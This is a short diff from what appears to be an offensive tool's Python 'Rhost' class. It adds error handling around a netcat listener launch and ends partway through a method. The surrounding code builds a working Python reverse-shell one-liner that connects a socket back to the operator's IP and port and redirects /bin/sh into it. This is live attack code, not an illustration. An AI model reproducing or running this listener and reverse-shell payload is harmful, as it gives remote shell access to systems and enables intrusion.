@@ -18,7 +18,10 @@ class Rhost:
         port = random.randint(1000,20000)
         name = socket.gethostname()
         ip = socket.gethostbyname(name)
-        subprocess.call(["terminator","-x","nc -lnvp %s"%(port)])
+        try:
+            subprocess.call(["terminator","-x","nc -lnvp %s"%(port)])
+        except:
+            print("You can't run 'shell module' as root :(")
         time.sleep(1)
         try:
             cmd = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""%(ip,port)
